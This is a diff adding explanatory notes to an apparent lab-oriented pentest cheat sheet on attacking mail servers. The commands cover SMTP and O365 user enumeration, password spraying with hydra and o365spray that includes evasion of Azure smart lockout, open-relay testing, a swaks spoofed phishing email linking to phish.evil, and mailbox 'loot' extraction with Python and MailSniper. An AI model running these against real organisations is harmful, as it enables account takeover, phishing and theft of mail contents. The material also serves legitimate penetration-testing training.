@@ -31,6 +31,7 @@ Mail infrastructure is a multi-protocol, multi-port surface (SMTP submission/rel
                                                                                               ^
 [Client] <----IMAP (143/993) / POP3 (110/995)--------------------------------------------------|
 ```
+> SMTP is for sending, IMAP/POP3 are for receiving. Port 25 is MTA-to-MTA (relay). Port 587 is the authenticated client submission port. Attack all three depending on what's exposed.
 
 | Port | Service | Role |
 |------|---------|------|
@@ -60,6 +61,7 @@ dig +short MX inlanefreight.com
 host -t A mail1.inlanefreight.com
 # 10.129.14.128
 ```
+> The MX record reveals the mail provider. A Google or Microsoft answer means cloud tenants — use o365spray or CredKing. A custom hostname means on-prem — port-scan it and use protocol-based attacks.
 
 ### Reading the MX answer
 
@@ -77,6 +79,7 @@ sudo nmap -Pn -sV -sC -p25,110,143,465,587,993,995 10.129.14.128
 # 25/tcp  open smtp Postfix smtpd
 # |_smtp-commands: mail1.inlanefreight.htb, PIPELINING, SIZE 10240000, VRFY, ETRN, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING
 ```
+> Scans all 7 standard mail ports. `-sC` runs default scripts that show SMTP capabilities. The `VRFY` in the banner means user enumeration is likely possible. Replace the IP with your target.
 
 The `-sC` banner already tells you whether `VRFY` is enabled.
 
@@ -146,6 +149,7 @@ smtp-user-enum -M RCPT -U userlist.txt -D inlanefreight.htb -t 10.129.203.7
 # 10.129.203.7: pedro@inlanefreight.htb exists
 # 10.129.203.7: kate@inlanefreight.htb exists
 ```
+> `-M RCPT` uses the RCPT TO method. `-U` is the username wordlist. `-D` is the domain suffix added to each username. `-t` is the target IP. Replace all three with your target's values. Use `-M VRFY` only if the banner confirms VRFY is allowed.
 
 | Mode | When to use |
 |------|-------------|
@@ -165,6 +169,7 @@ smtp-user-enum -M RCPT -U userlist.txt -D inlanefreight.htb -t 10.129.203.7
 o365spray --validate --domain msplaintext.xyz
 # [VALID] The following domain is using O365: msplaintext.xyz
 ```
+> Always validate the tenant first. If the domain does not use O365, the enum and spray commands won't work. Replace `msplaintext.xyz` with your target domain.
 
 Internally checks `https://login.microsoftonline.com/getuserrealm.srf?login=foo@<domain>` and the `autodiscover-s.outlook.com` DNS — no traffic to the customer.
 
@@ -175,6 +180,7 @@ o365spray --enum -U users.txt --domain msplaintext.xyz
 # [VALID] lewen@msplaintext.xyz
 # [VALID] juurena@msplaintext.xyz
 ```
+> `-U` is the username wordlist. `--domain` is the target tenant domain. Valid users are printed with `[VALID]`. Replace the wordlist path and domain with your target's values.
 
 Other working O365 enum vectors (rotate when one rate-limits):
 
@@ -194,6 +200,7 @@ Cloud tenants almost always normalize usernames. Generate candidate lists with m
 # username-anarchy generates first.last, flast, firstl, etc.
 username-anarchy -i names.txt > users.txt
 ```
+> `-i` reads a file of names (one per line, `First Last` format). Outputs all common username permutations. Feed `users.txt` into o365spray or smtp-user-enum.
 
 ---
 
@@ -208,6 +215,7 @@ hydra -L users.txt -p 'Company01!' -f 10.10.110.20 pop3
 hydra -L users.txt -p 'Spring2026!' -f 10.10.110.20 imap
 hydra -L users.txt -p 'Spring2026!' -f 10.10.110.20 smtp -s 587
 ```
+> `-L` is the user list, `-p` sprays one password across all users. `-f` stops after the first hit. `-s 587` overrides the default port for SMTP submission. Replace the IP, user list, and password with your target's values.
 
 Hydra patterns:
 
@@ -224,6 +232,7 @@ Hydra patterns:
 o365spray --spray -U usersfound.txt -p 'March2022!' --count 1 --lockout 1 --domain msplaintext.xyz
 # [VALID] lewen@msplaintext.xyz:March2022!
 ```
+> `-U` is the list of valid users from enumeration. `-p` is the password to spray. `--count 1` sprays one password per cycle. `--lockout 1` waits 1 minute between cycles to avoid Azure smart lockout. Replace the password, user list, and domain with your target's values.
 
 | Flag | Purpose |
 |------|---------|
@@ -258,6 +267,7 @@ o365spray --spray -U usersfound.txt -p 'March2022!' --count 1 --lockout 1 --doma
 nmap -p25 -Pn --script smtp-open-relay <ip>
 # |_smtp-open-relay: Server is an open relay (14/16 tests)
 ```
+> Replace `<ip>` with the target SMTP server. The script tries 16 different envelope combinations. Even 1/16 is a reportable finding — it means spoofed email delivery is possible for at least some scenarios.
 
 The script tries 16 envelope/header combinations (foreign sender, foreign recipient, `<>` MAIL FROM, source-routed addresses, etc.). Even **partial** open relays (1/16) are reportable — they often allow internal-spoofed phishing.
 
@@ -270,6 +280,7 @@ swaks --from notifications@inlanefreight.com \
       --body 'Hi All, please complete the survey: http://phish.evil/' \
       --server 10.10.11.213
 ```
+> `--from` sets the envelope sender (what SPF checks). `--to` is the recipient. `--header` adds mail headers. `--server` is the relay SMTP IP. Replace all values with your target's. Add `--tls` for STARTTLS and `--auth LOGIN` for authenticated submission.
 
 `swaks` walks the SMTP conversation verbosely — perfect for screenshots in a report. Key flags:
 
@@ -326,6 +337,7 @@ for n in data[0].split():
     print(email.message_from_bytes(msg[0][1]))
 "
 ```
+> `mutt` opens an interactive mailbox TUI — use for quick browsing. The Python one-liner dumps all messages to stdout — use for automated loot extraction. Replace the IP, username, and password with your target's credentials.
 
 `MailSniper` does the same against EWS for M365 / Exchange.
 
@@ -334,6 +346,7 @@ for n in data[0].split():
 ```powershell
 Invoke-GlobalO365MailboxSearch -ExchangeVersion Exchange2013 -UserName lewen@msplaintext.xyz -Password 'March2022!' -Terms 'password','vpn','secret'
 ```
+> Part of the MailSniper PowerShell module. Searches all accessible mailboxes for the listed keywords. Replace `UserName`, `Password`, and `Terms` with your values. Requires EWS access to the Exchange server.
 
 ---
 
@@ -350,6 +363,7 @@ nmap -Pn -sV -sC -p25,110,143,465,587,993,995 10.129.203.12
 # 143/tcp  open imap     hMailServer
 # 587/tcp  open smtp     hMailServer
 ```
+> Replace the IP with your target. The banner reveals the mail server software — hMailServer in this case. Use the software name to look up default credentials and known VRFY/EXPN behavior.
 
 **Gotcha:** EHLO advertises `VRFY` in HELP output but the server returns `502 VRFY disallowed.` for every query. Ignore the banner — pivot straight to **RCPT TO** mode.
 
